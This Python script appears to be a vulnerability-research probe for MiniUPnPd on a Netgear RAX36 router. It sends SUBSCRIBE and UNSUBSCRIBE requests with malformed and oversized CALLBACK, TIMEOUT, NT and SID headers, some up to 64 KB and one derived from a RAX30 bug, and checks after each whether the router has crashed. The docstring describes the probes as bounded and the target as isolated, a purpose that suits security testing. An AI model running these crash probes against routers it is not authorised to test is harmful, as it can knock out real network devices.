#!/usr/bin/env python3
"""Bounded RAX30-derived eventing probes for isolated RAX36 MiniUPnPd."""

from __future__ import annotations

import socket
import time


HOST = "192.168.1.1"
PORT = 56688


def exchange(payload: bytes, timeout: float = 2.0) -> bytes:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
        client.settimeout(timeout)
        client.bind(("192.168.1.2", 0))
        client.connect((HOST, PORT))
        client.sendall(payload)
        client.shutdown(socket.SHUT_WR)
        client.settimeout(timeout)
        output = bytearray()
        try:
            while len(output) < 65536:
                chunk = client.recv(4096)
                if not chunk:
                    break
                output.extend(chunk)
        except (TimeoutError, socket.timeout):
            pass
        return bytes(output)


def status(payload: bytes) -> str:
    return payload.splitlines()[0].decode("iso-8859-1", "replace") if payload else "no-response"


def healthy() -> bool:
    try:
        response = exchange(
            b"GET /rootDesc.xml HTTP/1.1\r\n"
            b"Host: 192.168.1.1:56688\r\nConnection: close\r\n\r\n"
        )
        return response.startswith(b"HTTP/1.1 200")
    except OSError:
        return False


def event_request(
    method: bytes,
    headers: list[tuple[bytes, bytes]],
) -> bytes:
    return (
        method
        + b" /evt/L3F HTTP/1.1\r\n"
        + b"Host: 192.168.1.1:56688\r\n"
        + b"".join(name + b": " + value + b"\r\n" for name, value in headers)
        + b"Content-Length: 0\r\n"
        + b"Connection: close\r\n\r\n"
    )


def subscribe(callback: bytes) -> bytes:
    return event_request(
        b"SUBSCRIBE",
        [
            (b"CALLBACK", b"<" + callback + b">"),
            (b"NT", b"upnp:event"),
            (b"TIMEOUT", b"Second-1800"),
        ],
    )


def main() -> int:
    cases = [
        ("control", subscribe(b"http://192.168.1.2:9/event")),
        (
            "rax30-73-byte-callback",
            subscribe(b"http://192.168.1.2/FRIDAY_RAX36_PROBE_7b6f2a" + b"A" * 32),
        ),
        ("missing-scheme", subscribe(b"A" * 73)),
        ("callback-8192", subscribe(b"http://192.168.1.2/" + b"A" * 8192)),
        ("callback-65536", subscribe(b"http://192.168.1.2/" + b"A" * 65536)),
        (
            "timeout-65536",
            event_request(
                b"SUBSCRIBE",
                [
                    (b"CALLBACK", b"<http://192.168.1.2:9/event>"),
                    (b"NT", b"upnp:event"),
                    (b"TIMEOUT", b"A" * 65536),
                ],
            ),
        ),
        (
            "nt-65536",
            event_request(
                b"SUBSCRIBE",
                [
                    (b"CALLBACK", b"<http://192.168.1.2:9/event>"),
                    (b"NT", b"A" * 65536),
                    (b"TIMEOUT", b"Second-1800"),
                ],
            ),
        ),
        (
            "duplicate-callback",
            event_request(
                b"SUBSCRIBE",
                [
                    (b"CALLBACK", b"<http://192.168.1.2:9/one>"),
                    (b"CALLBACK", b"<http://192.168.1.2:9/two>"),
                    (b"NT", b"upnp:event"),
                ],
            ),
        ),
        (
            "renewal-sid-8192",
            event_request(
                b"SUBSCRIBE",
                [(b"SID", b"uuid:" + b"A" * 8192), (b"TIMEOUT", b"Second-1800")],
            ),
        ),
        (
            "unsubscribe-sid-8192",
            event_request(b"UNSUBSCRIBE", [(b"SID", b"uuid:" + b"A" * 8192)]),
        ),
    ]
    if not healthy():
        print("baseline_failed")
        return 2
    for name, payload in cases:
        try:
            response = exchange(payload)
            result = status(response)
        except OSError as error:
            result = f"socket-error:{error}"
        time.sleep(0.25)
        alive = healthy()
        print(f"{name} request_bytes={len(payload)} status={result} alive={alive}")
        if not alive:
            print(f"crash_candidate={name}")
            return 1
    print("result=no-observable-eventing-dos")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
